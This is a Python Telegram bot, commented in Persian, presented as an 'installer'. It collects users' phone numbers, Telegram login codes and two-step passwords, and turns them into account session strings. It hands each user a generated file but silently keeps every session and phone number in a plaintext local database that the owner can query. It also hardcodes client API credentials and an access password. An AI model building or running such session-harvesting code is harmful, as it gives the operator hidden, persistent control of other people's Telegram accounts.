# installer.py — نسخه بدون‌باگ + پایدار

import os, re, json, time, asyncio, logging, traceback
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from tinydb import TinyDB, Query

# ----------------------------
# تنظیمات
# ----------------------------
API_ID = int(os.environ.get("API_ID", 2040))
API_HASH = os.environ.get("API_HASH", "b18441a1ff607e10a989891a5462e627")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
OWNER = int(os.environ.get("OWNER_ID", 7282052302))
DB_PATH = "users.json"

# ----------------------------
# تنظیم لاگ
# ----------------------------
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ----------------------------
# دیتابیس
# ----------------------------
db = TinyDB(DB_PATH)
users_table = db.table("users")

# یکنواخت‌سازی user_id ها
def fix_uid(uid):
    try:
        return str(int(uid))
    except:
        return str(uid)

def add_user(user_id):
    user_id = fix_uid(user_id)
    if not users_table.contains(Query().id == user_id):
        users_table.insert({
            'id': user_id,
            'try': 3,
            'installed': False,
            'step': None,
            'temp_session': None,
            'phone': None,
            'session': None
        })

def get_user(user_id):
    user_id = fix_uid(user_id)
    user = users_table.get(Query().id == user_id)
    if not user:
        add_user(user_id)
        user = users_table.get(Query().id == user_id)
    return user

def update_user(user_id, data: dict):
    user_id = fix_uid(user_id)
    users_table.update(data, Query().id == user_id)

# ----------------------------
# تبدیل متن به کد
# ----------------------------
num_dict = {
    "zero":"0","one":"1","two":"2","three":"3","four":"4",
    "five":"5","six":"6","seven":"7","eight":"8","nine":"9",
    "0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9"
}

def convert_code(text):
    code = ""
    for word in text.strip().split():
        if word.lower() in num_dict:
            code += num_dict[word.lower()]
        elif word.isdigit():
            code += word
    return code if code else None

# ----------------------------
# ساخت فایل کاربر
# ----------------------------
def create_user_file(user_id, session_string):
    filename = f"user_{user_id}.py"
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(f'SESSION = "{session_string}"\n')
            if os.path.exists("worker.py"):
                with open("worker.py","r",encoding="utf-8") as wf:
                    f.write(wf.read())
            else:
                f.write("# worker.py پیدا نشد\n")
        return filename
    except Exception as e:
        logger.error(f"خطا در ساخت فایل کاربر: {e}")
        return None

# ----------------------------
# ربات
# ----------------------------
bot = TelegramClient('installer', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ----------------------------
# شروع
# ----------------------------
@bot.on(events.NewMessage(pattern="/start"))
async def start_handler(event):
    user_id = fix_uid(event.sender_id)
    add_user(user_id)
    user = get_user(user_id)

    if user["installed"]:
        return await event.reply("سورس قبلاً نصب شده حاج ✅")

    await event.reply("پسوردتو وارد کن حاج")

# ----------------------------
# هندل همه پیام‌ها
# ----------------------------
@bot.on(events.NewMessage())
async def all_messages(event):
    user_id = fix_uid(event.sender_id)

    if not users_table.contains(Query().id == user_id):
        return

    user = get_user(user_id)
    text = event.text.strip()

    # ----------------------------
    # مرحله 1: پسورد
    # ----------------------------
    if user["step"] is None:
        if text == "J123J":
            update_user(user_id, {"step": "phone"})
            return await event.reply("پسورد درست بود حاج ✅\nحالا شمارتو بده")
        else:
            tries = user["try"] - 1
            update_user(user_id, {"try": tries})
            if tries <= 0:
                return await event.reply("بُن شدی حاج 😭")
            return await event.reply(f"پسورد اشتباه حاج 😭 {tries} فرصت موند")

    # ----------------------------
    # مرحله 2: شماره
    # ----------------------------
    if user["step"] == "phone":
        if not re.match(r"^\+\d{10,15}$", text):
            return await event.reply("شماره اشتباه حاج 😭 با + بزن")

        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            await client.send_code_request(text)
            update_user(user_id, {
                "step": "code",
                "phone": text,
                "temp_session": client.session.save()
            })
            return await event.reply("کد ارسال شد حاج\nکد رو وارد کن")
        except Exception as e:
            logger.error(str(e))
            return await event.reply("خطا در ارسال کد حاج 😭")
        finally:
            try: await client.disconnect()
            except: pass

    # ----------------------------
    # مرحله 3: کد تایید
    # ----------------------------
    if user["step"] == "code":
        code = convert_code(text)
        if not code or len(code) < 4:
            return await event.reply("کد نامعتبر حاج 😭 دوباره بزن")

        try:
            client = TelegramClient(StringSession(user["temp_session"]), API_ID, API_HASH)
            await client.connect()
            await client.sign_in(user["phone"], code)
            session = client.session.save()
        except Exception as e:
            if "password" in str(e).lower():
                update_user(user_id, {"step": "2fa"})
                return await event.reply("رمز دوم داره حاج 😭 رمز رو بده")
            return await event.reply("کد غلط حاج 😭")
        finally:
            try: await client.disconnect()
            except: pass

        filename = create_user_file(user_id, session)
        update_user(user_id, {"installed": True, "session": session})

        await event.reply("نصب کامل شد حاج ✅")
        await event.reply(file=filename)
        await asyncio.sleep(1)
        try: os.remove(filename)
        except: pass
        return

    # ----------------------------
    # مرحله 4: رمز دوم
    # ----------------------------
    if user["step"] == "2fa":
        try:
            client = TelegramClient(StringSession(user["temp_session"]), API_ID, API_HASH)
            await client.connect()
            await client.sign_in(password=text)
            session = client.session.save()
        except:
            return await event.reply("رمز دوم اشتباه حاج 😭")
        finally:
            try: await client.disconnect()
            except: pass

        filename = create_user_file(user_id, session)
        update_user(user_id, {"installed": True, "session": session})

        await event.reply("نصب کامل شد حاج ✅")
        await event.reply(file=filename)
        await asyncio.sleep(1)
        try: os.remove(filename)
        except: pass


# ----------------------------
# دستورات ادمین
# ----------------------------
@bot.on(events.NewMessage(pattern=r"^/stats$"))
async def stats_handler(event):
    if event.sender_id != OWNER:
        return
    total = len(users_table)
    installed = len([u for u in users_table.all() if u.get("installed")])
    await event.reply(f"کاربرها: {total}\nنصب‌شده‌ها: {installed} حاج")

# ----------------------------
# شروع ربات
# ----------------------------
print("ربات نصب‌کننده آماده‌ست حاج...")
bot.run_until_disconnected()
